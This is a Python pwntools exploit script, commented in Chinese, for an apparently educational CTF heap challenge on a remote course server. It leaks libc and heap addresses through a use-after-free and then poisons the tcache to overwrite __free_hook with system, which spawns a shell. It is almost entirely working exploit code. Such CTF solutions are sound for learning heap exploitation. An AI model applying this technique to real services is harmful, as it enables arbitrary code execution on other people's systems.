from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./final')
r = remote('edu-ctf.zoolab.org', 30210)
def buy(idx, nlen, name):
    r.sendlineafter('> ', '1')
    r.sendlineafter('cat or dog ?\n> ', 'cat')
    r.sendlineafter("len of name:\n> ", str(nlen))
    r.sendafter('name:\n> ', name)
    r.sendlineafter('where to keep (0 or 1) ?\n> ', str(idx))

def release(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('which one to release (0 or 1) ?\n> ', str(idx))

def change(idx, nlen, name, len_change):
    r.sendlineafter('> ', '3')
    r.sendlineafter('which one to change (0 or 1) ?\n> ', str(idx))
    if len_change == True:
        r.sendlineafter('will the len of name change (y/n) ?\n> ', 'y')
        r.sendlineafter("new len of name:\n> ", str(nlen))
    else:
        r.sendlineafter('will the len of name change (y/n) ?\n> ', 'n')
    r.sendafter('new name:\n> ', name)

def play(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter('which one to play (0 or 1) ?\n> ', str(idx))

def exploit():
    # 2. 同上，目標是要寫任意大小的
    buy(1, 0x28, b'A'*0x10 + p64(0x10000) + p64(heap + 0xbe0) + p64(0xdeadbeef))
    buy(1, 0x10, 'dummy')
    release(1)
    # gdb.attach(r)

    # 3. 蓋寫 animals[0] 的 key 時需注意 release() 也會釋放 name 欄位，因此要塞入一個合法的 chunk 位址
    # 這裡實際是改寫animal[1]
    #    - type: AAAAAAAA 
    #    - len: 0xdeadbeef
    #    - name: heap+0xb40 (animal[1])
    #    - bark: null
    # 這裡改寫0x6bd0的name為0x6b30，這樣在free 0x6bd0的name時，會free到0x6b30整塊，讓tcache變成
    change(0, 0xffffffff, b'A'*0x10 + p64(0xdeadbeef) + p64(heap + 0xb40), False) 
    release(1)
    change(0, 0xffffffff, b'A'*0x10 + p64(0xdeadbeef) + p64(heap + 0xb90), False)
    release(1)
    # 4. 此時我們可以蓋寫 tcache fd 成 __free_hook - 8，而 __free_hook-8 ~ __free_hook 可以放 "/bin/sh\x00"
    change(0, 0xffffffff, p64(__free_hook - 8), False)
    # 當我們請求 0x28 大小的 chunk，會取得 __free_hook 的位址，寫入 system
    buy(1, 0x28, b'/bin/sh\x00' + p64(_system))
    # 5. get shell
    release(1)

# 1. 首先 allocate chunk size 0x420，釋放後再次取得，利用殘留在 chunk 的 unsorted bin 位址來 leak libc
buy(0, 0x410, 'dummy')
buy(1, 0x410, 'dummy') # 由於 freed chunk 相鄰 top chunk 時會觸發 consolidate，因此多放一塊 chk 來避免
release(0)
buy(0, 0x410, 'AAAAAAAA')

play(0)
r.recvuntil('A'*8)

# 從 bk 留下的 unsorted bin address 來 leak (算main_arena跟libc的offset = 1ebbe0)
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
_system = libc + 0x55410
__free_hook = libc + 0x1eeb28
one_shot = libc + 0xe6c84
binsh = libc + 0x1b75aa
info(f"libc: {hex(libc)}")

# 2. 再利用 UAF 去 leak tcache 的 fd，得到 heap address
buy(0, 0x10, 'dummy')
buy(1, 0x10, 'dummy')
release(0)
release(1)

play(1)
r.recvuntil('MEOW, I am a cute ')
# Note: 此時tcache animal[1]的 type 欄位會存 [ next (animal[0] addr) | key(tcache struct address) ]
# 計算animal[0]跟heap base 的offset = 0xb40 
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0xb40
info(f"heap: {hex(heap)}")

exploit()
r.interactive()